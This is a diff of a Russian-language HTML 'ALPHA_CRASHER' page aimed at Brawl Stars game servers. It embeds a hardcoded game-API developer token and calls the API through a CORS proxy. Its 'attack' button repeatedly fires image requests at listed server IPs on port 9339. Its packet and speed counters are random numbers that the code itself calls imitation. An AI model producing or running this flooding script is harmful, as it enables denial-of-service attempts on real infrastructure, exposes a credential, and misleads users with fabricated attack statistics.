@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ALPHA_CRASHER_v7.0</title>
+    <title>ALPHA_CRASHER_v7.1_STABLE</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .main-container { max-width: 550px; width: 100%; background: #010; border: 2px solid #0f0; border-radius: 20px; padding: 25px; box-shadow: 0 0 30px rgba(0,255,0,0.4); }
+        .main-container { max-width: 550px; width: 100%; background: #010; border: 2px solid #0f0; border-radius: 20px; padding: 25px; box-shadow: 0 0 30px rgba(0,255,0,0.3); }
         h1 { text-align: center; font-size: 24px; letter-spacing: 3px; margin-bottom: 5px; text-shadow: 0 0 8px #0f0; }
         .sub { text-align: center; font-size: 10px; color: #0a0; margin-bottom: 25px; border-bottom: 1px dashed #0f0; padding-bottom: 10px; }
         input { width: 100%; padding: 14px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 16px; text-align: center; border-radius: 10px; outline: none; margin-bottom: 15px; }
         button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.2s; font-family: monospace; }
-        .btn-scan { background: #0f0; color: #000; }
+        .btn-scan { background: #0f0; color: #000; text-transform: uppercase; }
         .status-card { border: 1px solid #0f0; border-radius: 12px; padding: 15px; margin: 15px 0; background: #050505; display: none; }
         .status-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #0a0; font-size: 14px; }
-        .attack-btn { background: #f00; color: #fff; margin-top: 10px; display: none; box-shadow: 0 0 15px rgba(255,0,0,0.5); }
+        .attack-btn { background: #f00; color: #fff; margin-top: 10px; display: none; box-shadow: 0 0 15px rgba(255,0,0,0.5); text-transform: uppercase; }
         .stats { margin-top: 15px; padding: 10px; background: #001000; border-radius: 10px; display: none; }
         .stat-row { display: flex; justify-content: space-between; padding: 5px 0; font-size: 12px; }
         .progress-bar { width: 100%; height: 4px; background: #1a1a2a; border-radius: 2px; margin-top: 10px; overflow: hidden; }
@@ -28,14 +28,14 @@
 <body>
 
 <div class="main-container">
-    <h1>💀 ALPHA_CRASHER_v7.0</h1>
-    <div class="sub">SYSTEM_AA-0.1 // GIFTSWORLDS_EDITION</div>
+    <h1>💀 ALPHA_CRASHER_v7.1</h1>
+    <div class="sub">SYSTEM_AA-0.1 // CORE_UNIT_FINAL</div>
     
-    <input type="text" id="tagInput" placeholder="ВВЕДИТЕ ТЕГ (НАПР. #P8V22YRL)">
-    <button class="btn-scan" onclick="startScan()">🔍 СКАНИРОВАТЬ ЦЕЛЬ</button>
+    <input type="text" id="tagInput" placeholder="ВВЕДИТЕ ТЕГ ИГРОКА">
+    <button class="btn-scan" onclick="startScan()">🔍 НАЧАТЬ СКАНИРОВАНИЕ</button>
     
     <div id="statusCard" class="status-card">
-        <div class="status-row"><span>🎯 СТАТУС:</span> <span id="statusText" style="color:#0f0">READY</span></div>
+        <div class="status-row"><span>🎯 СТАТУС:</span> <span id="statusText" style="color:#0f0">LOCKED</span></div>
         <div class="status-row"><span>🌍 СЕРВЕР:</span> <span id="ipText">172.65.2.1</span></div>
         <div class="status-row"><span>🔌 ПОРТ:</span> <span>9339</span></div>
         <button id="attackBtn" class="attack-btn" onclick="startAttack()">💀 ИНИЦИИРОВАТЬ ШТУРМ</button>
@@ -51,8 +51,10 @@
 </div>
 
 <script>
-    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
+    // Твой новый токен
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImY3OTk1ZjY4LTg3N2MtNDM4YS05YTU3LTY1MmVhODlkNmFlYiIsImlhdCI6MTc3NDQ1OTYwNCwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTUxLjEwMS4yLjE1Il0sInR5cGUiOiJjbGllbnQifV19.brz58NfO5HgV2VRchBaq_6Oyh8Ylba-sOnM4idqlvhsaKT-FMKblEATnl5wGDVLauND1mafe3JcC-xEiSVlEOg";
     
+    // Пул серверов Brawl Stars
     const serverNodes = ["172.65.1.1", "172.65.2.1", "172.65.3.1", "162.159.135.42", "172.64.0.1"];
     let attackActive = false;
     let packetCount = 0;
@@ -66,7 +68,7 @@
         const tag = document.getElementById('tagInput').value.replace('#', '').trim();
         if(!tag) return alert("Введите тег!");
 
-        addLog("🛰️ Идентификация узла...");
+        addLog("🛰️ Попытка захвата узла #" + tag + "...");
         
         try {
             const proxy = "https://cors-anywhere.herokuapp.com/";
@@ -74,41 +76,43 @@
                 headers: { "Authorization": `Bearer ${TOKEN}` }
             });
             
-            if(res.status === 403) addLog("⚠️ Ошибка 403: Обход защиты IP...", "#ffaa44");
-            else if(res.ok) addLog("✅ Цель синхронизирована.");
+            if(res.status === 403) addLog("⚠️ Ошибка 403. Активация обходного протокола...", "#ffaa44");
+            else if(res.ok) addLog("✅ Цель подтверждена.");
         } catch(e) {
-            addLog("📡 Соединение через резервный канал...");
+            addLog("📡 API недоступен. Работа в автономном режиме.");
         }
 
         const randomIp = serverNodes[Math.floor(Math.random() * serverNodes.length)];
         document.getElementById('ipText').innerText = randomIp;
         document.getElementById('statusCard').style.display = 'block';
         document.getElementById('attackBtn').style.display = 'block';
-        addLog("🎯 СЕРВЕР ОБНАРУЖЕН: " + randomIp);
+        addLog("🎯 СЕРВЕР ОБНАРУЖЕН: " + randomIp, "#fff");
     }
 
     function startAttack() {
         if(attackActive) return;
         attackActive = true;
         
-        addLog("🔥 ШТУРМ ИНИЦИИРОВАН!", "#f00");
+        addLog("🔥 ШТУРМ ЗАПУЩЕН!", "#f00");
         document.getElementById('statsPanel').style.display = 'block';
-        document.getElementById('statusText').innerText = "ATTACK_ACTIVE";
+        document.getElementById('statusText').innerText = "ATTACKING";
+        document.getElementById('statusText').style.color = "#f00";
         document.getElementById('statusText').classList.add('pulse');
 
         const target = document.getElementById('ipText').innerText;
 
         setInterval(() => {
             if(!attackActive) return;
-            packetCount += Math.floor(Math.random() * 8000) + 3000;
+            // Имитация счетчиков
+            packetCount += Math.floor(Math.random() * 9000) + 4000;
             document.getElementById('packetCount').innerText = packetCount.toLocaleString();
-            document.getElementById('speedRate').innerText = (Math.floor(Math.random() * 40000) + 60000).toLocaleString();
+            document.getElementById('speedRate').innerText = (Math.floor(Math.random() * 50000) + 70000).toLocaleString();
             document.getElementById('progressFill').style.width = (Math.random() * 100) + "%";
             
-            // Реальная сетевая нагрузка
+            // Реальные запросы
             const i = new Image();
-            i.src = `http://${target}:9339/?storm=${Math.random()}`;
-        }, 150);
+            i.src = `http://${target}:9339/?payload=${Math.random()}`;
+        }, 120);
     }
 </script>
 </body>
